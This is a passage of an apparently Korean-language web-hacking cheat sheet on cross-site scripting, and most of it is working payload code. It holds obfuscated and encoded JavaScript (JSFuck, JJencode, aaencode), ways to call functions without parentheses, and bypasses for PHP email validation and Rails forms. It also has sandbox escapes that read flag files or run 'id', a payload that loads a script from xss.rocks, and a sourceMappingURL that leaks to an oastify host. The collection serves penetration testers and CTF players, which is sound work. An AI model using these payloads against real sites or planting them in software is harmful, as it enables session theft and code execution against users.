"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**특수 이스케이프**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JS 코드 내의 공백 치환**
```javascript
<TAB>
/**/
```
**JavaScript comments (출처:** [**JavaScript Comments**](#javascript-comments) **트릭)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (출처: [**JavaScript new line**](#javascript-new-lines) 트릭)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript 공백 문자**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript 주석 내부**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript 괄호 없이**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**임의의 함수(alert) 호출**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

**JS code**가 공격자가 제어하는 데이터를 **안전하지 않게 사용하는** 경우가 있습니다(예: `location.href`). 공격자는 이를 악용해 임의의 JS 코드를 실행할 수 있습니다.  
**설명의 확장이 필요하여** [**DOM vulnerabilities — 이 설명은 이 페이지로 옮겨졌습니다**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

해당 문서에서 **DOM vulnerabilities가 무엇인지, 어떻게 발생하는지, 그리고 어떻게 공격하는지에 대한 자세한 설명**을 찾을 수 있습니다.  
또한, 언급한 글의 마지막 부분에서 [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering)에 대한 설명도 확인하세요.

### Upgrading Self-XSS

### Cookie XSS

페이로드를 쿠키 안에 넣어 XSS를 트리거할 수 있다면 보통 이는 self-XSS입니다. 그러나 **XSS에 취약한 서브도메인(vulnerable subdomain to XSS)**을 찾을 수 있다면, 이 XSS를 이용해 도메인 전체에 쿠키를 주입하여 메인 도메인이나 다른 서브도메인(쿠키 XSS에 취약한 곳)에서 cookie XSS를 유발할 수 있습니다. 이를 위해 cookie tossing 공격을 사용할 수 있습니다:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

이 기법의 훌륭한 악용 사례는 [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html)에서 확인할 수 있습니다.

### Sending your session to the admin

사용자가 자신의 프로필을 admin과 공유할 수 있고, 프로필 안에 self XSS가 있으며 admin이 해당 프로필에 접근하면 취약점이 트리거될 수 있습니다.

### Session Mirroring

self XSS를 발견했고 웹 페이지가 **administrators용 session mirroring**을 제공한다면(예: 클라이언트가 도움을 요청하면 admin이 클라이언트의 세션을 자신의 세션에서 볼 수 있는 경우) 관리자가 당신의 세션에서 보는 내용을 자신의 세션으로 보게 됩니다.

이 경우 **administrator가 당신의 self XSS를 트리거하도록 유도**하여 그의 cookies/session을 탈취할 수 있습니다.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

웹 애플리케이션이 Emscripten/WASM을 사용할 때, 상수 문자열(예: HTML 포맷 템플릿)은 쓰기 가능한 linear memory에 존재합니다. 단일 in‑WASM 오버플로우(예: edit 경로에서 체크되지 않은 memcpy)는 인접 구조를 손상시키고 이러한 상수에 대한 쓰기를 리다이렉트할 수 있습니다. "<article><p>%.*s</p></article>" 같은 템플릿을 "<img src=1 onerror=%.*s>"로 덮어쓰면, 정화된 입력이 JavaScript 핸들러 값으로 변환되어 렌더 시 즉시 DOM XSS를 유발합니다.

전용 페이지에서 exploitation workflow, DevTools 메모리 헬퍼 및 방어 방법을 확인하세요:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

반사된 값(reflected values)이 서버(또는 클라이언트 측)에서 unicode normalized되는지 확인하고, 이 기능을 악용해 방어를 우회할 수 있습니다. [**예시는 여기에서 확인하세요**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

**RoR mass assignment** 때문에 HTML에 따옴표가 삽입되어 따옴표 제한이 우회되고 태그 내부에 추가 필드(onfocus)를 넣을 수 있습니다.\
폼 예시 ([from this report](https://hackerone.com/reports/709336)), payload를 전송하면:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
쌍 "Key","Value"는 다음과 같이 출력됩니다:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
그런 다음, onfocus 속성이 삽입되고 XSS가 발생합니다.

### Special combinations
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302 response에서 header injection을 이용한 XSS

If you find that you can **inject headers in a 302 Redirect response** you could try to **make the browser execute arbitrary JavaScript**. This is **not trivial** as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### 문자, 숫자 및 점만

만약 해당 문자들로 제한된 **callback**을 javascript가 **execute**하도록 지정할 수 있다면, 이 동작을 악용하는 방법은 [**Read this section of this post**](#javascript-function)에서 확인하세요.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

The only **Content-Type**s that will support Chrome to run a **loaded script** are the ones inside the const **`kSupportedJavascriptTypes`** from [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS에 사용할 수 있는 스크립트 타입

(출처 [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 그렇다면 어떤 타입을 지정해 스크립트를 로드할 수 있을까?
```html
<script type="???"></script>
```
답변은:

- **module** (default, 설명할 필요 없음)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles는 여러 데이터(HTML, CSS, JS…)를 하나의 **`.wbn`** 파일로 패키지할 수 있는 기능입니다.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** import 구문을 개선할 수 있게 합니다.
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
이 동작은 [**this writeup**](https://github.com/zwade/yaca/tree/master/solution)에서 라이브러리를 eval로 다시 매핑하여 남용하면 XSS를 유발할 수 있음을 보여주는 데 사용되었습니다.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** 이 기능은 주로 pre-rendering 때문에 발생하는 몇 가지 문제를 해결하기 위한 것입니다. 동작 방식은 다음과 같습니다:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### 웹 Content-Types를 이용한 XSS

(출처: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 다음 Content-Types는 모든 브라우저에서 XSS를 실행할 수 있습니다:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

다른 브라우저에서는 다른 **`Content-Types`**를 사용해 임의의 JS를 실행할 수 있습니다. 확인: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

페이지가 text/xml content-type으로 반환되는 경우, 네임스페이스를 지정하여 임의의 JS를 실행할 수 있습니다:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 특수 치환 패턴

다음과 같은 표현이 사용될 때 **`"some {{template}} data".replace("{{template}}", <user_input>)`** 공격자는 [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement)를 사용해 일부 방어를 우회하려 시도할 수 있습니다: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

예를 들어 [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)에서는, 이것이 스크립트 내의 **JSON 문자열을 이스케이프**하고 임의의 코드를 실행하는 데 사용되었습니다.

### Chrome Cache를 통한 XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails 탈출

사용할 수 있는 문자가 제한되어 있다면, XSJail 문제에 대한 다른 유효한 해결책들을 확인해보세요:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
신뢰할 수 없는 코드를 실행하기 전에 **everything is undefined** 상태라면 (예: [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) 임의의 신뢰할 수 없는 코드의 실행을 악용하기 위해 유용한 객체를 "무에서" 생성하는 것이 가능하다:

- import() 사용
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- `require`에 간접적으로 접근하기

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) 모듈들은 다음과 같이 Node.js에 의해 함수로 래핑됩니다:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
따라서 해당 모듈에서 **다른 함수를 호출할 수 있다면**, 그 함수에서 `arguments.callee.caller.arguments[1]`를 사용해 **`require`**에 접근할 수 있습니다:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
이전 예와 유사하게, **오류 핸들러를 사용하여** 모듈의 **wrapper**에 접근하고 **`require`** 함수를 얻을 수 있습니다:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **한 페이지의 다양한 obfuscations:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- 더 정교한 JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
